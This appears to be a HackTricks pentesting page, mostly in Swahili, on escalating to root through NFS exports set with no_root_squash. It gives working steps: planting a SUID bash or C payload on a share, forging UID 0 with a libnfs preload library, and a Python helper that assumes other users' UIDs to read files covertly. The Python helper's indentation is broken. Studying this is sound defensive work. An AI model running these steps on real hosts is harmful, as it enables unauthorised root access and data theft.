# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya Msingi kuhusu Squashing

Kwa NFS AUTH_SYS/AUTH_UNIX, server huweka msingi wa ukaguzi wa ruhusa za faili kwenye `uid` na `gid` zinazotumwa katika kila ombi la RPC. Security flavors nyingine, kama vile Kerberos, hutumia credentials tofauti, na server inaweza ku-map credentials za nambari kabla ya kukagua ruhusa.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Hu-map kila UID na GID kwenye akaunti ya anonymous, ambayo kwa kawaida huwa `nobody` (65534) kwenye Linux. `no_all_squash` ndiyo default kwa maombi yasiyo ya root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Hii ndiyo default kwenye Linux na hu-map maombi yenye UID/GID 0 (root) kwenye akaunti ya anonymous; UID na GID nyingine hazifanyiwi squash.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Huzima root squashing, hivyo maombi yenye UID/GID 0 yanaweza kutathminiwa kama root kwenye server.<sup>[[4]](#references)</sup>

Ikiwa client iliyoruhusiwa inaweza ku-mount export inayoweza kuandikwa katika **`/etc/exports`** iliyosanidiwa na **`no_root_squash`**, maombi yake ya UID/GID 0 yanaweza kuandika humo kama root user wa server.<sup>[[4]](#references)</sup>

Kwa maelezo zaidi kuhusu **NFS**, angalia:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 ukitumia bash:
- Kwenye client iliyoruhusiwa, mount export inayoweza kuandikwa kama root, nakili **`/bin/bash`** ndani yake, weka bit ya **SUID**, kisha i-execute kutoka kwenye victim mount isiyotumia `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
- Ili faili iliyopakiwa iendelee kuwa owned na root, server lazima itumie **`no_root_squash`**. Ikiwa root imefanyiwa squash, SUID binary ya akaunti nyingine inawezekana tu wakati client inaweza kuiunda au kuimiliki kihalali kwa kutumia numeric UID/GID ya akaunti hiyo.<sup>[[4]](#references)</sup>
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Chaguo la 2 kwa kutumia code ya C iliyocompile:
- Mount directory kutoka kwa client iliyoruhusiwa, nakili payload iliyocompile inayotumia vibaya permissions za SUID, weka bit yake ya **SUID**, na i-execute kutoka kwa victim (tazama baadhi ya [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Vizuizi vilevile kama hapo awali
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwenye machine yako hadi kwenye machine ya victim bado unaweza kutumia version ya Remote ku-exploit privilege escalation hii kwa kutunnel ports zinazohitajika**.\
> Trick ifuatayo ni muhimu wakati `/etc/exports` inazuia export kwa IP ya victim: remote client haiwezi kui-mount, lakini local technique inaweza kufanya kazi kupitia share ambayo tayari ime-mountiwa kwenye host iliyoruhusiwa.<sup>[[2]](#references)</sup>\
> Kwa njia hii ya libnfs isiyo na privileges, export katika **`/etc/exports`** lazima itumie flag ya `insecure` ili process iweze kutumia source port isiyohifadhiwa; `secure` ndiyo default, ingawa process inayoweza ku-bind port iliyohifadhiwa haihitaji option hii.<sup>[[1]](#references)[[4]](#references)</sup>

### Maelezo ya Msingi

NFSv3 AUTH_UNIX client hujumuisha effective UID, GID na groups zake katika kila call, na server huzitumia kufanya permission checks. Local technique hii hutumia vibaya model hiyo kwa kughushi RPC credentials kupitia [libnfs](https://github.com/sahlberg/libnfs); preload module yake inasaidia kubadilisha UID/GID katika NFS context.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kukompile Library

Mfano wa libnfs unaweza kuhitaji marekebisho kulingana na target kernel; walkthrough iliyotumika hapa inataja hasa ku-comment out fallocate syscalls kabla ya kukompile preload module.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Kuendesha Exploit

Mfano huu huunda C helper ndogo inayozindua shell, kisha huiweka kwenye share na kutumia `ld_nfs.so` yenye UID 0 katika context ya NFS ili kuifanya kuwa SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Compile exploit code:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Weka exploit kwenye share na ubadilishe permissions zake kwa kughushi UID**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Tekeleza exploit ili kupata root privileges**.<sup>[[2]](#references)</sup>
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell kwa Ufikiaji wa Faili kwa Stealth

Mara tu access ya root inapopatikana, pattern hii ya `nfsh.py` huweka effective UID kuwa UID ya faili lengwa kabla ya kuendesha command, na hivyo kuruhusu access bila kubadilisha ownership recursively.<sup>[[2]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Iendeshe kama:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Simulizi la NFS privesc isiyojulikana sana](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Maelezo ya Itifaki ya NFS Toleo la 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
